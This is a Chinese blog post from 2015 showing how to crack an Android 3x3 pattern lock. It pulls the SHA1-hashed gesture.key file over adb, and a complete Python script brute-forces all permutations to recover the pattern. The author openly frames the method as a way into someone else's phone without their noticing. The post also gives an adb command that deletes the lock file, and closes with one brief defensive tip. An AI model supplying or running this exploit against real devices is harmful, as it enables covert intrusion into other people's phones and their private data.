---
ID: 3955
post_title: >
  ANDROID-如何破解安卓手机上的图形锁(九宫格锁)
author: ChinaBUG
post_excerpt: ""
layout: post
permalink: >
  http://blog.ipodmp.com/2015/03/android-graphics-on-how-to-hack-android-lock-jiu-gong-gesuo.html
published: true
post_date: 2015-03-06 09:23:31
---
<div class="content bgF8F8F8 f14">
<div id="content">

安卓手机的图形锁(九宫格)是3×3的点阵，按次序连接数个点从而达到锁定/解锁的功能。最少需要连接4个点，最多能连接9个点。网上也有暴力删除手机图形锁的方法，即直接干掉图形锁功能。但假如你想进入别人的手机，但又不想引起其警觉的话……你可以参考一下本文。

<a href="http://s3.51cto.com/wyfs02/M00/5A/26/wKioL1T4BzWAXbBjAAERg7NiUGY203.jpg" target="_blank"><img class="fit-image" src="http://s3.51cto.com/wyfs02/M00/5A/26/wKioL1T4BzWAXbBjAAERg7NiUGY203.jpg" alt="如何破解安卓手机上的图形锁(九宫格锁)" width="474" height="588" border="0" /></a>

前提条件：手机需要root，而且打开调试模式。一般来讲，如果用过诸如“豌豆荚手机助手”、“360手机助手”一类的软件，都会被要求打开调试模式的。如果要删除手机内置软件，则需要将手机root。

<strong>原理分析</strong>

首先科普一下，安卓手机是如何标记这9个点的。通过阅读安卓系统源码可知，每个点都有其编号，组成了一个3×3的矩阵，形如：

00 01 02

03 04 05

06 07 08

假如设定解锁图形为一个“L”形，如图：

<a href="http://s7.51cto.com/wyfs02/M01/5A/2A/wKiom1T4BujRjoo4AACaKtlnnME746.png" target="_blank"><img class="fit-image" src="http://s7.51cto.com/wyfs02/M01/5A/2A/wKiom1T4BujRjoo4AACaKtlnnME746.png" alt="如何破解安卓手机上的图形锁(九宫格锁)" width="443" height="419" border="0" /></a>

那么这几个点的排列顺序是这样的：00 03 06 07 08。系统就记下来了这一串数字，然后将这一串数字(以十六进制的方式)进行SHA1加密，存储在了手机里的/data/system /gesture.key 文件中。我们用数据线连接手机和电脑，然后ADB连接手机，将文件下载到电脑上(命令：adb pull /data/system/gesture.key gesture.key)，如图：

<a href="http://s1.51cto.com/wyfs02/M01/5A/26/wKioL1T4CA2Rk4CfAAAmKq5EOmE291.png" target="_blank"><img class="fit-image" style="width: 470px; height: 100px;" src="http://s1.51cto.com/wyfs02/M01/5A/26/wKioL1T4CA2Rk4CfAAAmKq5EOmE291.png" alt="如何破解安卓手机上的图形锁(九宫格锁)" width="534" height="124" border="0" /></a>

用WinHex等十六进制编辑程序打开gesture.key，会发现文件内是SHA1加密过的字符串：c8c0b24a15dc8bbfd411427973574695230458f0，如图：

<a href="http://s3.51cto.com/wyfs02/M02/5A/26/wKioL1T4CB_xP87NAAAdYW9ttqE449.png" target="_blank"><img class="fit-image" style="width: 495px; height: 146px;" src="http://s3.51cto.com/wyfs02/M02/5A/26/wKioL1T4CB_xP87NAAAdYW9ttqE449.png" alt="如何破解安卓手机上的图形锁(九宫格锁)" width="703" height="238" border="0" /></a>

当你下次解锁的时候，系统就对比你画的图案，看对应的数字串是不是0003060708对应的加密结果。如果是，就解锁;不是就继续保持锁定。那 么，如果穷举所有的数字串排列，会有多少呢?联想到高中的阶乘，如果用4个点做解锁图形的话，就是9x8x7x6=3024种可能性，那5个点就是 15120，6个点的话60480，7个点181440，8个点362880，9个点362880。总共是985824种可能性(但这么计算并不严密，因 为同一条直线上的点只能和他们相邻的点相连)。

满打满算，也不到985824种可能性。乍一看很大，但在计算机面前，穷举出来这些东西用不了几秒钟。

<strong>破解过程</strong>

知道了原理，就着手写程序来实现吧。这里使用了Python来完成任务。主要应用了hashlib模块(对字符串进行SHA1加密)和itertools模块(Python内置，生成00-09的排列组合)。

主要流程为：

1.ADB连接手机，获取gesture.key文件

2.读取key文件，存入字符串str_A

3.生成全部可能的数字串

4.对这些数字串进行加密，得到字符串str_B

5.将字符串str_A与str_B进行对比

6.如果字符串A，B相同，则说明数字串num就是想要的解锁顺序

7.打印出数字串num

下面为程序：
<pre class="prettyprint lang-python prettyprinted"><span class="com"># -*- coding: cp936 -*-</span><span class="kwd">import</span><span class="pln"> itertools
</span><span class="kwd">import</span><span class="pln"> hashlib
</span><span class="kwd">import</span><span class="pln"> time
</span><span class="kwd">import</span><span class="pln"> os

</span><span class="com">#调用cmd，ADB连接到手机,读取SHA1加密后的字符串</span><span class="pln">
os</span><span class="pun">.</span><span class="pln">system</span><span class="pun">(</span><span class="str">"adb pull /data/system/gesture.key gesture.key"</span><span class="pun">)</span><span class="pln">
time</span><span class="pun">.</span><span class="pln">sleep</span><span class="pun">(</span><span class="lit">5</span><span class="pun">)</span><span class="pln">
f</span><span class="pun">=</span><span class="pln">open</span><span class="pun">(</span><span class="str">'gesture.key'</span><span class="pun">,</span><span class="str">'r'</span><span class="pun">)</span><span class="pln">
pswd</span><span class="pun">=</span><span class="pln">f</span><span class="pun">.</span><span class="pln">readline</span><span class="pun">()</span><span class="pln">
f</span><span class="pun">.</span><span class="pln">close</span><span class="pun">()</span><span class="pln">
pswd_hex</span><span class="pun">=</span><span class="pln">pswd</span><span class="pun">.</span><span class="pln">encode</span><span class="pun">(</span><span class="str">'hex'</span><span class="pun">)</span><span class="kwd">print</span><span class="pln"> </span><span class="str">'加密后的密码为：%s'</span><span class="pun">%</span><span class="pln">pswd_hex

</span><span class="com">#生成解锁序列，得到['00','01','02','03','04','05','06','07','08']</span><span class="pln">
matrix</span><span class="pun">=[]</span><span class="pln"> 
</span><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="lit">9</span><span class="pun">):</span><span class="pln">
    str_temp </span><span class="pun">=</span><span class="pln"> </span><span class="str">'0'</span><span class="pun">+</span><span class="pln">str</span><span class="pun">(</span><span class="pln">i</span><span class="pun">)</span><span class="pln">
    matrix</span><span class="pun">.</span><span class="pln">append</span><span class="pun">(</span><span class="pln">str_temp</span><span class="pun">)</span><span class="com">#将00——08的字符进行排列，至少取4个数排列，最多全部进行排列</span><span class="pln">

min_num</span><span class="pun">=</span><span class="lit">4</span><span class="pln">
max_num</span><span class="pun">=</span><span class="pln">len</span><span class="pun">(</span><span class="pln">matrix</span><span class="pun">)</span><span class="kwd">for</span><span class="pln"> num </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="pln">min_num</span><span class="pun">,</span><span class="pln">max_num</span><span class="pun">+</span><span class="lit">1</span><span class="pun">):#从</span><span class="lit">04</span><span class="pln"> </span><span class="pun">-&gt;</span><span class="pln"> </span><span class="lit">08</span><span class="pln">
    iter1 </span><span class="pun">=</span><span class="pln"> itertools</span><span class="pun">.</span><span class="pln">permutations</span><span class="pun">(</span><span class="pln">matrix</span><span class="pun">,</span><span class="pln">num</span><span class="pun">)#从</span><span class="lit">9</span><span class="pun">个数字中挑出</span><span class="pln">n</span><span class="pun">个进行排列</span><span class="pln">
    list_m</span><span class="pun">=[]</span><span class="pln">
    list_m</span><span class="pun">.</span><span class="pln">append</span><span class="pun">(</span><span class="pln">list</span><span class="pun">(</span><span class="pln">iter1</span><span class="pun">))#将生成的排列全部存放到</span><span class="pln"> list_m </span><span class="pun">列表中</span><span class="pln">
    </span><span class="kwd">for</span><span class="pln"> el </span><span class="kwd">in</span><span class="pln"> list_m</span><span class="pun">[</span><span class="lit">0</span><span class="pun">]:#遍历这</span><span class="pln">n</span><span class="pun">个数字的全部排列</span><span class="pln">
        strlist</span><span class="pun">=</span><span class="str">''</span><span class="pun">.</span><span class="pln">join</span><span class="pun">(</span><span class="pln">el</span><span class="pun">)#将</span><span class="pln">list</span><span class="pun">转换成</span><span class="pln">str</span><span class="pun">。[</span><span class="lit">00</span><span class="pun">,</span><span class="lit">03</span><span class="pun">,</span><span class="lit">06</span><span class="pun">,</span><span class="lit">07</span><span class="pun">,</span><span class="lit">08</span><span class="pun">]--&gt;</span><span class="lit">0003060708</span><span class="pln">
        strlist_sha1 </span><span class="pun">=</span><span class="pln"> hashlib</span><span class="pun">.</span><span class="pln">sha1</span><span class="pun">(</span><span class="pln">strlist</span><span class="pun">.</span><span class="pln">decode</span><span class="pun">(</span><span class="str">'hex'</span><span class="pun">)).</span><span class="pln">hexdigest</span><span class="pun">()#将字符串进行</span><span class="pln">SHA1</span><span class="pun">加密</span><span class="pln">
        </span><span class="kwd">if</span><span class="pln"> pswd_hex</span><span class="pun">==</span><span class="pln">strlist_sha1</span><span class="pun">:#将手机文件里的字符串与加密字符串进行对比</span><span class="pln">
            </span><span class="kwd">print</span><span class="pln"> </span><span class="str">'解锁密码为：'</span><span class="pun">,</span><span class="pln">strlist</span></pre>
<strong>总结</strong>

从程序本身来说，得到解锁密码后应该用break跳出循环并终止程序运行。但Python并没有跳出多重循环的语句，如果要跳出多重循环，只能设置 标志位然后不停进行判定。为了运行速度就略去了“跳出循环”这个步骤。(有没有更好的实现跳出多重循环的方法?)另外也略去了很多容错语句。从破解目的来 说，如果单单是忘记了自己的手机图形锁密码，完全可以用更简单的办法：ADB连接手机，然后“adb rm /data/system/gesture.key”删除掉gesture.key文件，此时图形锁就失效了，随意画一下就能解锁。但本文开篇假设的是 “为了不被察觉地进入到别人的手机里”，所以就有了这篇文章。

最后提一个安全小建议：如果手机已root，还要用“XX手机助手”，还想设置图形锁的话——在手机“设置”选项里，有一个“锁定状态下取消USB 调试模式”(这个名字因手机而异，而且有的有此选项，有的手机就没有)，开启此功能之后，在手机锁定状态下就能够防范此类攻击了。此文技术原理很简单，还 望各位大大传授些高大上的Python编程技巧。

本文摘自《<a href="http://netsecurity.51cto.com/art/201503/467409.htm">如何破解安卓手机上的图形锁(九宫格锁)</a>》

</div>
</div>